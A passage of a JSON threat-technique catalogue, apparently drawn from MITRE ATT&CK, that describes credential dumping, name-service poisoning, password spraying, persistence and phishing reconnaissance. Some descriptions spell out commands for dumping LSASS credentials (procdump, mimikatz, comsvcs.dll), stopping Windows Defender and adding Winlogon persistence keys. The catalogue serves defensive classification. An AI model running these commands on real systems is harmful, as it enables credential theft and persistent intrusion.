    "description": "Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) Establishing email accounts may also allow adversaries to abuse free services  such as trial periods  to [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) for follow-on purposes.(Citation: Free Trial PurpleUrchin)Adversaries may also take steps to cultivate a persona around the email account, such as through use of [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001), to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).(Citation: Mandiant APT1)To decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.(Citation: Trend Micro R980 2016) ",
    "similar_words": [
      "Email Accounts"
    ],
    "id": "T1585.002"
  },
  "attack-pattern--650c784b-7504-4df7-ab2c-4ea882384d1e": {
    "name": "LLMNR/NBT-NS Poisoning and SMB Relay",
    "example_uses": [
      "modules like ntlmrelayx and smbrelayx can be used in conjunction with  and  to gather NetNTLM credentials for  or relay attacks that can gain code execution.",
      "can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks.",
      "can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks.",
      "executed  using the command [Responder file path] -i [IP address] -rPv on a compromised host to harvest credentials and move laterally.",
      "has used the Invoke-Inveigh PowerShell cmdlets likely for name service poisoning.",
      "can sniff plaintext network credentials and use NBNS Spoofing to poison name services.",
      "is used to poison name services to gather hashes and credentials from systems within a local network."
    ],
    "description": "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.Several tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation: GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)",
    "similar_words": [
      "LLMNR/NBT-NS Poisoning and SMB Relay"
    ],
    "id": "T1557.001"
  },
  "attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90": {
    "name": "LSASS Memory",
    "example_uses": [
      "used  to carry out credential dumping using ProcDump.",
      "During  threat actors used ProcDump to dump credentials from memory.",
      "has used credential dumping tools such as  to steal credentials to accounts logged into the compromised system and to Outlook Web Access.",
      "has been known to dump credentials using Mimikatz and Windows Credential Editor.",
      "used several tools for retrieving login and password information including LaZagne and Mimikatz.",
      "actors have used a modified version of  called Wrapikatz to dump credentials. They have also dumped credentials from domain controllers.",
      "can create a memory dump of LSASS via the `MiniDumpWriteDump Win32` API call.",
      "has been known to use credential dumping using .",
      "During  threat actors used Task Manager to dump LSASS memory from Windows devices to disk.",
      "has used publicly available tools to dump password hashes including ProcDump and WCE.",
      "harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE).",
      "can perform credential dumping from memory to obtain account and password information.",
      "has used procdump to dump the LSASS process memory.",
      "has used Mimikatz to retrieve credentials from LSASS memory.",
      "can dump active logon session password hashes from the lsass process.",
      "can run  to harvest credentials.",
      "has attempted to access hashed credentials from the LSASS process memory space.",
      "has used  to obtain credentials.",
      "has used a variety of publicly available tools like   and ProcDump to dump credentials.",
      "has obtained memory dumps with ProcDump to parse and extract credentials from a victim's LSASS process memory with .",
      "has used  to harvest credentials from the victim's machine.",
      "used Mimikatz and customized versions of Windows Credential Dumper to harvest credentials.",
      "has executed  to harvest stored credentials from the victim and further victim penetration.",
      "SecretsDump and  modules within  can perform credential dumping to obtain account and password information.",
      "used a modified version of  along with a PowerShell-based  to dump credentials on the victim machines.",
      "contains a modified version of  to help gather credentials that are later used for lateral movement.",
      "can execute Lazagne as well as  using PowerShell.",
      "has used the Task Manager process to target LSASS process memory in order to obtain NTLM password hashes.  has also dumped clear text passwords and hashes from memory using  hosted through an RDP mapped drive.",
      "can spawn a job to inject into LSASS memory and dump password hashes.",
      "contains an implementation of  to gather credentials from memory.",
      "has used various tools (such as Mimikatz and WCE) to perform credential dumping.",
      "can dump credentials.",
      "has used Mimikatz Windows Credential Editor and ProcDump to dump credentials.",
      "In the   used Mimikatz.",
      "has stolen domain credentials by dumping LSASS process memory using Task Manager comsvcs.dll and from a Microsoft Active Directory Domain Controller using .",
      "has used ProcDump to obtain the hashes of credentials by dumping the memory of the LSASS process.",
      "used voStro.exe a compiled pypykatz (Python version of ) to steal credentials.",
      "has been observed dropping password grabber modules including .",
      "has used keyloggers that are also capable of dumping credentials.",
      "has used prodump to dump credentials from LSASS.",
      "uses credential dumpers such as  and  to extract cached credentials from Windows systems.",
      "has used the Farse6.1 utility (based on ) to extract credentials from lsass.exe.",
      "During the   used  to capture and use legitimate credentials.",
      "can perform OS credential dumping using .",
      "performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways including from the LSASS Memory.",
      "has used its plainpwd tool a modified version of  and comsvcs.dll to dump Windows credentials from system memory.",
      "has performed credential dumping with  and procdump64.exe.",
      "has dumped the lsass.exe memory to harvest credentials with the use of open-source tool .",
      "has attempted to harvest credentials through LSASS memory dumping.",
      "has dumped credentials including by using .",
      "has used a tool to dump credentials by injecting itself into lsass.exe and triggering with the argument dig.",
      "has used hashdump  and the Windows Credential Editor to dump password hashes from memory and authenticate to other user accounts.",
      "contains an implementation of  to gather credentials from memory.",
      "leverages  and  to steal credentials.",
      "has used  for credential dumping.",
      "can dump password hashes from `LSASS.exe`.",
      "regularly deploys both publicly available (ex: ) and custom password retrieval tools on victims. They have also dumped the LSASS process memory using the MiniDump function.",
      "contains a module that tries to obtain credentials from LSASS similar to . These credentials are used with  and  to help the malware propagate itself across a network.",
      "has gathered credentials using  and ProcDump.",
      "was seen using MimikatzLite to perform credential dumping.",
      "contains a collection of Exfiltration modules that can harvest credentials using .",
      "During the  campaign  used Mimikatz and a custom tool SecHack to harvest credentials.",
      "has a module for  to collect Windows credentials from the victims machine.",
      "used tools such as  to dump LSASS memory to capture credentials in victim environments.",
      "During  threat actors dumped LSASS memory on compromised hosts.",
      "has been observed dropping and executing password grabber modules including .",
      "retrieved credentials from LSASS memory.",
      "has used hashdump  Procdump and the Windows Credential Editor to dump password hashes from memory and authenticate to other user accounts.",
      "uses legitimate Sysinternals tools such as procdump to dump LSASS memory.",
      "has used  and the Windows Task Manager to dump LSASS process memory.",
      "used  to obtain passwords from memory.",
      "has a built-in `procdump` command allowing for retrieval of memory from processes such as `lsass.exe` for credential harvesting."
    ],
    "description": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.For example, on the target host use procdump:* procdump -ma lsass.exe lsass_dumpLocally, mimikatz can be run using:* sekurlsa::Minidump lsassdump.dmp* sekurlsa::logonPasswordsBuilt-in Windows tools such as `comsvcs.dll` can also be used:* rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)Similar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages and HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)The following SSPs can be used to access credentials:* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)",
    "similar_words": [
      "LSASS Memory"
    ],
    "id": "T1003.001"
  },
  "attack-pattern--67073dde-d720-45ae-83da-b12d5e73ca3b": {
    "name": "Active Scanning",
    "example_uses": [
      "In the   engaged in network reconnaissance against targets of interest."
    ],
    "description": "Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.Adversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.(Citation: Botnet Scan)(Citation: OWASP Fingerprinting) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",
    "similar_words": [
      "Active Scanning"
    ],
    "id": "T1595"
  },
  "attack-pattern--67720091-eee3-4d2d-ae16-8264567f6f5b": {
    "name": "Abuse Elevation Control Mechanism",
    "example_uses": [
      "implements a variation of the ucmDccwCOMMethod technique abusing the Windows AutoElevate backdoor to bypass UAC while elevating privileges."
    ],
    "description": "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.(Citation: TechNet How UAC Works)(Citation: sudo man page 2018) An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.(Citation: OSX Keydnap malware)(Citation: Fortinet Fareit)",
    "similar_words": [
      "Abuse Elevation Control Mechanism"
    ],
    "id": "T1548"
  },
  "attack-pattern--677569f9-a8b0-459e-ab24-7f18091fa7bf": {
    "name": "Create Process with Token",
    "example_uses": [
      "can call WTSQueryUserToken and CreateProcessAsUser to start a new process with local system privileges.",
      "RPC backdoors can impersonate or steal process tokens before executing commands.",
      "can attempt to gain administrative privileges using token impersonation.",
      "keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call CreateProcessAsUserA under that user's context.",
      "can use Invoke-RunAs to make tokens.",
      "has the ability to execute a process using runas.",
      "can launch an instance of itself with administrative rights using runas.",
      "has a command called RunAs which creates a new process as another user or process context.",
      "The  third stage can use the AdvancedRun.exe tool to execute commands in the context of the Windows TrustedInstaller group via `%TEMP%\\AdvancedRun.exe /EXEFilename C:\\Windows\\System32\\sc.exe /WindowState 0 /CommandLine stop WinDefend /StartDirectory /RunAs 8 /Run`.",
      "has duplicated the token of a high integrity process to spawn an instance of cmd.exe under an impersonated user.",
      "grabs a user token using WTSQueryUserToken and then creates a process by impersonating a logged-on user.",
      "can use Invoke-RunAs to make tokens."
    ],
    "description": "Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as CreateProcessWithTokenW and runas.(Citation: Microsoft RunAs)Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) before being used to create a process.While this technique is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001), the techniques can be used in conjunction where a token is duplicated and then used to create a new process.",
    "similar_words": [
      "Create Process with Token"
    ],
    "id": "T1134.002"
  },
  "attack-pattern--6831414d-bb70-42b7-8030-d4e06b2660c9": {
    "name": "Setuid and Setgid",
    "example_uses": [
      "adds the setuid flag to a binary so it can easily elevate in the future.",
      "can execute commands with high privileges via a specific binary with setuid functionality."
    ],
    "description": "An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) users context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.(Citation: setuid man page) Normally an application is run in the current users context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). The chmod command can set these bits with bitmasking, chmod 4777 [file] or via shorthand naming, chmod u+s [file]. This will enable the setuid bit. To enable the setgid bit, chmod 2775 and chmod g+s can be used.Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware) This abuse is often part of a \"shell escape\" or other actions to bypass an execution environment with restricted permissions.Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)). The setuid and setguid bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via ls -l. The find command can also be used to search for such files. For example, find / -perm +4000 2>/dev/null can be used to find files with setuid set and find / -perm +2000 2>/dev/null may be used for setgid. Binaries that have these bits set may then be abused by adversaries.(Citation: GTFOBins Suid)",
    "similar_words": [
      "Setuid and Setgid"
    ],
    "id": "T1548.001"
  },
  "attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35": {
    "name": "Winlogon Helper DLL",
    "example_uses": [
      "can establish persistence by setting the value Shell with explorer.exe %malware_pathfile% under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.",
      "has established persistence via the `Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon` registry key.",
      "A  variant registers as a Winlogon Event Notify DLL to establish persistence.",
      "has established persistence using Userinit by adding the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.",
      "can use Winlogon Helper DLL to establish persistence.",
      "achieves persistence using Userinit by adding the Registry key HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit.",
      "creates a Registry key at HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell to survive a system reboot.",
      "has created the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell and sets the value to establish persistence.",
      "established persistence by adding a Shell value under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.",
      "issues the command reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon to achieve persistence.",
      "adds the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon to establish persistence.",
      "can enable automatic logon through the `SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon` Registry key."
    ],
    "description": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs onAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",
    "similar_words": [
      "Winlogon Helper DLL"
    ],
    "id": "T1547.004"
  },
  "attack-pattern--68a0c5ed-bee2-4513-830d-5b0d650139bd": {
    "name": "Distributed Component Object Model",
    "example_uses": [
      "can utilize Invoke-DCOM to leverage remote COM execution for lateral movement.",
      "can use `System` namespace methods to execute lateral movement using DCOM.",
      "can deliver Beacon payloads for lateral movement by leveraging remote COM execution."
    ],
    "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI)",
    "similar_words": [
      "Distributed Component Object Model"
    ],
    "id": "T1021.003"
  },
  "attack-pattern--692074ae-bb62-4a5e-a735-02cb6bde458c": {
    "name": "Password Spraying",
    "example_uses": [
      "s infpub.dat file uses NTLM login credentials to brute force Windows machines.",
      "can brute force credential authentication by using a supplied list of usernames and a single password.",
      "brute forces SSH passwords in order to attempt to gain access and install its malware onto the server.",
      "has conducted brute force password spray attacks.",
      "has used password spraying attacks to obtain valid credentials.",
      "malware attempts to connect to Windows shares for lateral movement by using a generated list of usernames which center around permutations of the username Administrator and weak passwords.",
      "has used password spraying to gain access to target systems.",
      "has used collected lists of names and e-mail accounts to use in password spraying attacks against private sector targets.",
      "has used multiple password spraying attacks against victim's remote services to obtain valid user and administrator accounts.",
      "can be used for password spraying against Exchange and Office 365.",
      "used a tool called Total SMB BruteForcer to perform internal password spraying.",
      "has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks.  has also used a Kubernetes cluster to conduct distributed large-scale password spray attacks.",
      "engaged in password spraying via SMB in victim environments.",
      "has conducted password spraying against Outlook Web Access (OWA) infrastructure to identify valid user names and passwords.",
      "has gained initial access through password spray attacks.",
      "During   performed password-spray attacks against public facing services to validate credentials."
    ],
    "description": "Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:* SSH (22/TCP)* Telnet (23/TCP)* FTP (21/TCP)* NetBIOS / SMB / Samba (139/TCP & 445/TCP)* LDAP (389/TCP)* Kerberos (88/TCP)* RDP / Terminal Services (3389/TCP)* HTTP/HTTP Management Services (80/TCP & 443/TCP)* MSSQL (1433/TCP)* Oracle (1521/TCP)* MySQL (3306/TCP)* VNC (5900/TCP)In addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
    "similar_words": [
      "Password Spraying"
    ],
    "id": "T1110.003"
  },
  "attack-pattern--69b8fd78-40e8-4600-ae4d-662c9d7afdb3": {
    "name": "External Proxy",
    "example_uses": [
      "can proxy traffic via SOCKS.",
      "has used various tools to proxy C2 communications.",
      "can use pre-configured HTTP proxies.",
      "has a module that can proxy C2 communications.",
      "used other victims as proxies to relay command traffic for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router.  has also used a machine to relay and obscure communications between  and their server.",
      "maintains access to victim environments by using  to create a proxy for a backup RDP tunnel.",
      "has routed their traffic through an external server in order to obfuscate their location.",
      "can leverage a modified SOCKS5 proxy to tunnel egress C2 traffic.",
      "The  HTTP/S C2 mode can make use of an external proxy.",
      "has used multiple proxies to obfuscate network traffic from victims.",
      "has used a global service provider's IP as a proxy for C2 traffic from a victim.",
      "An  downloader establishes SOCKS5 connections for its initial C2.",
      "leveraged several compromised universities as proxies to obscure its origin.",
      "has connected to C2 servers through proxies.",
      "has used ProxyBot which allows the attacker to redirect traffic from the current node to the backconnect server via Sock4\\Socks5.",
      "can identify proxy servers configured and used by the victim and use it to make HTTP requests to C2 its server.",
      "used a modified version of  to redirect connections between networks.",
      "uses compromised residential endpoints as proxies for defense evasion and network access.",
      "has controlled  from behind a proxy network to obfuscate the C2 location.  has used a series of compromised websites that victims connected to randomly to relay information to command and control (C2).",
      "has been known to reach a command and control server via one of nine proxy IP addresses.",
      "InvisiMole can identify proxy servers used by the victim and use them for C2 communication."
    ],
    "description": "Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",
    "similar_words": [
      "External Proxy"
    ],
    "id": "T1090.002"
  },
  "attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e": {
    "name": "Web Portal Capture",
    "example_uses": [
      "In the   captured credentials as they were being changed by redirecting text-based login codes to websites they controlled.",
      "can capture credentials submitted during the web logon process in order to access layer seven applications such as RDP.",
      "The  OWA credential logger can monitor for OWA authentication requests and log the credentials.",
      "During  threat actors modified the JavaScript loaded by the Ivanti Connect Secure login page to capture credentials entered.",
      "registered and hosted domains to allow for creation of web pages mimicking legitimate government email logon sites to collect logon information."
    ],
    "description": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)",
    "similar_words": [
      "Web Portal Capture"
    ],
    "id": "T1056.003"
  },
  "attack-pattern--69f897fd-12a9-4c89-ad6a-46d2f3c38262": {
    "name": "Email Addresses",
    "example_uses": [
      "has used spoofed company emails that were acquired from email clients on previously infected hosts to target other individuals.",
      "collected email addresses belonging to various departments of a targeted organization which were used in follow-on phishing campaigns.",
      "has collected e-mail addresses for users they intended to target.",
      "has identified high-value email accounts in academia journalism NGO's foreign policy and national security for targeting.",
      "has collected e-mail addresses from targeted organizations from open Internet searches.",
      "has collected valid email addresses that were subsequently used in spearphishing campaigns.",
      "can check for the existence of user email addresses using public Microsoft APIs.",
      "has targeted executives human resources staff and IT personnel for spearphishing.",
      "has gathered employee email addresses including personal accounts for social engineering and initial access efforts.",
      "has gathered targeted individuals' e-mail addresses through open source research and website contact forms.",
      "has collected e-mail addresses for activists and bloggers in order to target them with spyware.",
      "has obtained valid emails addresses while conducting research against target organizations that were subsequently used in spearphishing campaigns.",
      "gathered victim email information in advance of phishing operations for targeted attacks.",
      "gathered victim email address information for follow-on phishing activity.",
      "has targeted the personal emails of key network and IT staff at victim organizations.",
      "utilizes thread spoofing of existing email threads in order to execute spear phishing operations.",
      "has collected valid email addresses including personal accounts that were subsequently used for spearphishing and other forms of social engineering."
    ],
    "description": "Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.Adversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: HackersArise Email)(Citation: CNET Leaks) Email addresses could also be enumerated via more active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.(Citation: GrimBlog UsernameEnum) For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.(Citation: GitHub Office 365 User Enumeration)(Citation: Azure Active Directory Reconnaisance)Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Brute Force](https://attack.mitre.org/techniques/T1110) via [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
    "similar_words": [
      "Email Addresses"
    ],
    "id": "T1589.002"
  },
  "attack-pattern--6a5d222a-a7e0-4656-b110-782c33098289": {
    "name": "Spearphishing Voice",
    "example_uses": [
      "During   used phone calls to instruct victims to navigate to credential-harvesting websites.",
      "has called victims' help desk to convince the support personnel to reset a privileged accounts credentials.",
      "During   used phone calls to instruct victims to navigate to credential-harvesting websites. has also called employees at target organizations and compelled them to navigate to fake login portals using adversary-in-the-middle toolkits."
    ],
    "description": "Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.All forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.(Citation: BOA Telephone Scams)Victims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to tailor pretexts to be even more persuasive and believable for the victim.",
    "similar_words": [
      "Spearphishing Voice"
    ],
    "id": "T1598.004"
  },
  "attack-pattern--6add2ab5-2711-4e9d-87c8-7a0be8531530": {
    "name": "Cached Domain Credentials",
    "example_uses": [
      "was seen using modified Quarks PwDump to perform credential dumping.",
      "has used a variety of publicly available tools like  to gather credentials.",
      "used several tools for retrieving login and password information including LaZagne.",
      "can extract cached password hashes from cache entry information.",
      "can perform credential dumping from MSCache to obtain account and password information.",
      "has used credential dumping tools such as  to steal credentials to accounts logged into the compromised system and to Outlook Web Access.",
      "can use Lazagne for harvesting credentials.",
      "has performed credential dumping with ."
    ],
